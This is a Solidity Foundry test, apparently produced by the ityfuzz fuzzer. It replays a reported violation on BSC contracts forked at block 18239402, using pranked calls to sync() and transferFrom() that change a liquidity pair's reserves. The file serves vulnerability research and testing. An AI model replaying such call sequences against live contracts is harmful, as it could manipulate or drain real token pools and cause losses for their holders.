// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0xEeBc161437FA948AAb99383142564160c92D2974,0xa0787daad6062349f63b7c228cbfd5d8a3db08f1,0x3463a663de4ccc59c8b21190f81027096f18cf2a,0x6Fb2020C236BBD5a7DDEb07E14c9298642253333,0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D -c bsc --onchain-block-number 18239402 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
0x128cd0ae1a0ae7e67419111714155e1b1c6b2d8d, Reserves changed from (0x00000000000000000000000000000000000000000000000024e65b5e8e51e1ec_U256, 0x000000000000000000000000000000000000000000000000000029e87b4f3098_U256) to (0x00000000000000000000000000000000000000000000000024e65b5e8e51e1ec_U256, 0x000000000000000000000000000000000000000000000000000029e87b4f7c08_U256)

================ Trace ================
[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   └─[1] 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D.sync()
[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   └─[1] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333.transferFrom(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, 0x10ED43C718714eb63d5aA57B78B54704E256024E, 19312)
[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   └─[1] 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D.sync()


 */

contract CEeBc is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 18239402);
    }

    function test() public {
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        IERC20(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D).sync();
        
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        IERC20(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333).transferFrom(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, 0x10ED43C718714eb63d5aA57B78B54704E256024E, 19312);
        
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        IERC20(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D).sync();
        
    }

}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
